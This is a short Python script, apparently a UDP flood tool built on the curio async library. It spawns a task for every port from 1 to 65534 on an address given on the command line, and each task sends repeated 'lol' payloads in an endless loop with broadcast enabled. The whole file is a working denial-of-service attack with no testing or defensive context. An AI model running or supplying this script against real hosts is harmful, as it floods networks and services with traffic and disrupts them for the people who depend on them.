import collections
import sys
import curio
from curio import socket

async def spammer(address, port):
    async with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        while True:
            try:
                await sock.sendto(b'lol' * 512, (address, port))
                await curio.sleep(0)
            except curio.TaskCancelled:
                break
        await sock.close()

async def spam(address):
    tasks = collections.deque()
    async with curio.TaskGroup(wait=10) as spammers:
        for i in range(1, 65535):
            tasks.append(await spammers.spawn(spammer, address, i))
        try:
            for t in tasks:
                await t.join()
        except KeyboardInterrupt:
            for t in tasks:
                await t.cancel()
        await spammers.join()

if __name__ == '__main__':
    addr = sys.argv[1]
    curio.run(spam, addr)
